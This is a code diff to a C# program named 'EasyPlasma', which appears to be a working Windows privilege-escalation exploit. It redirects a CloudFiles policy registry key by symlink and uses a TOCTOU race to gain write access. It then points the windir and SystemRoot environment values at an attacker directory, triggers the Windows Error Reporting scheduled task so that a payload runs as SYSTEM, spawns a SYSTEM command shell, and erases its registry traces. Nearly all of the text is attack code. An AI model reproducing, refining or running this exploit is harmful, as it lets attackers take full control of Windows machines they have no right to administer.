@@ -97,6 +97,7 @@ class EasyPlasma
     static string CF   => string.Join("\\",_reg,"Software","Policies","Microsoft","CloudFiles");
     static string BA   => CF + "\\BlockedApps";
     static string TK   => string.Join("\\",_reg,"Volatile Environment");
+    static string ENV  => string.Join("\\",_reg,"Environment"); /* non-volatile user env */
 
     const string PipeEsc = "easyplasma_esc"; /* escalation: user=server SYSTEM=client */
     const string PipeSrv = "easyplasma_srv"; /* fast path: SYSTEM=server user=client  */
@@ -248,53 +249,41 @@ if($r-eq 0){
         Console.Write("    S2 TOCTOU: "); RunToctou();
         Console.WriteLine("[+] Stage 2 done");
 
-        Console.WriteLine("[*] Stage 3: windir + WER...");
+        Console.WriteLine("[*] Stage 3: windir to VE...");
         MakeWritable(TK); Thread.Sleep(200);
-
         bool wrote = false;
         IntPtr hTK = OKey(TK, KEY_SET_VALUE);
         if (hTK!=IntPtr.Zero) {
-            /* Write both windir and SystemRoot - task might use either */
             foreach (string vname in new[]{"windir","SystemRoot"}) {
-                var vn = new US(vname);
-                var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
-                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true;
-                vn.Free();
+                var vn = new US(vname); var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
+                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true; vn.Free();
             }
             NtClose(hTK);
         }
-        if (!wrote) {
-            try {
-                var rk = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment",true)
-                      ?? Registry.Users.CreateSubKey(@".DEFAULT\Volatile Environment");
-                rk?.SetValue("windir",runDir);
-                rk?.SetValue("SystemRoot",runDir);
-                rk?.Close(); wrote=true;
-            } catch {}
-        }
-        if (!wrote){Console.WriteLine("[-] windir write failed");return false;}
+        if (!wrote){Console.WriteLine("[-] VE write failed");return false;}
+        Console.WriteLine($"[+] VE windir = {runDir}");
 
-        /* Verify we can read it back */
-        string verify = null;
-        try { verify = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment")
-                ?.GetValue("windir") as string; } catch {}
-        Console.WriteLine($"[+] windir written={runDir}  readback={verify??"(null)"}");
+        /* Stage 3b: redirect BlockedApps symlink to non-volatile .DEFAULT\Environment
+           and TOCTOU again to get write access there too */
+        Console.WriteLine("[*] Stage 3b: windir to non-volatile ENV...");
+        RecDelete(BA); Thread.Sleep(300);
+        CreateSymlinkPS(BA, ENV);
+        Console.Write("    TOCTOU: "); RunToctou();
+        MakeWritable(ENV); Thread.Sleep(100);
+        IntPtr hEnv = OKey(ENV, KEY_SET_VALUE);
+        if (hEnv!=IntPtr.Zero) {
+            foreach (string vname in new[]{"windir","SystemRoot"}) {
+                var vn = new US(vname); var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
+                NtSetValueKey(hEnv,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
+            }
+            NtClose(hEnv);
+            Console.WriteLine($"[+] ENV windir = {runDir}");
+        } else {
+            Console.WriteLine("[-] ENV not writable (continuing anyway)");
+        }
 
         PreparePayload(runDir);
 
-        /* Query the task XML to see the actual executable path */
-        var qpsi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
-            @"/query /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting"" /xml")
-            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
-        string xml = "";
-        using(var p=System.Diagnostics.Process.Start(qpsi))
-            xml = p.StandardOutput.ReadToEnd();
-        /* Extract just the Command line from XML */
-        int ci = xml.IndexOf("<Command>"), ce = xml.IndexOf("</Command>");
-        string taskExe = (ci>=0&&ce>ci) ? xml.Substring(ci+9,ce-ci-9) : "(not found)";
-        Console.WriteLine($"[+] Task exe: {taskExe}");
-
-        /* Trigger */
         var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
             @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
             {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
@@ -303,7 +292,7 @@ if($r-eq 0){
             taskOut = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
             p.WaitForExit(5000);
         }
-        Console.WriteLine($"[+] schtasks run: {taskOut.Trim()}");
+        Console.WriteLine($"[+] WER: {taskOut.Trim()}");
         return true;
     }
 
@@ -614,6 +603,8 @@ if($r-eq 0){
         Console.WriteLine("[*] Cleaning...");
         try{RecDelete(CF);}catch{}
         try{RecDelete(TK);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
         /* Remove scheduled task */
         System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
             "schtasks.exe",@"/delete /f /tn ""\EasyPlasma\Maintenance""")
@@ -712,6 +703,8 @@ if($r-eq 0){
             escPipe.Dispose();
             try{RecDelete(CF);}catch{}
             try{RecDelete(TK);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
             try{Directory.Delete(runDir,true);}catch{}
             if (File.Exists(@"C:\ProgramData\ep_system_ran.txt")) {
                 Console.WriteLine("[*] Debug (wermgr.exe did run):");
@@ -730,6 +723,8 @@ if($r-eq 0){
             escPipe.Dispose();
             try{RecDelete(CF);}catch{}
             try{RecDelete(TK);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
             try{Directory.Delete(runDir,true);}catch{}
             return;
         }
@@ -752,6 +747,8 @@ if($r-eq 0){
         Thread.Sleep(500);
         try{RecDelete(CF);}catch{}
         try{RecDelete(TK);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
+        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
         try{Directory.Delete(runDir,true);}catch{}
 
         /* Spawn SYSTEM cmd in this console */
